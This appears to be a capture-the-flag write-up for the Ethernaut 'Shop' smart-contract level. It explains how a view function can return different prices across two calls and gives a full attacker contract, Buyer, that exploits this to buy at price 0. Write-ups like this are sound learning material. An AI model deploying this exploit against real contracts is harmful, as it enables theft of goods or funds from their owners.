
As we have to use a view function, which does not allow as to change the state of our contract, neither any other contract, we have to use another contract to change state by itself. We do that by taking advantage of this change in the state of the shop contract.

if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }

As we can see, between the first and the second call to our buyer contract, there is a change in the value of `isSold`, according to which we will decide what our `price()` will return. Down below is the contract that I've created.


```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Shop {

    function isSold() external view returns (bool);
    function buy() external;
}

contract Buyer {

    address target;
    
    function price() public view returns(uint256) {
        bool response = Shop(target).isSold();
        if (response) {
            return 0;
        } else {
            return 100;
        }
    }

    
    function attack() public returns (bool){
        (bool sent,) = target.call(abi.encodeWithSignature("buy()"));
        return sent;
    }

    //Set the address of your level instance
    function setTarget(address _target) public {
        target = _target;
    }
}
```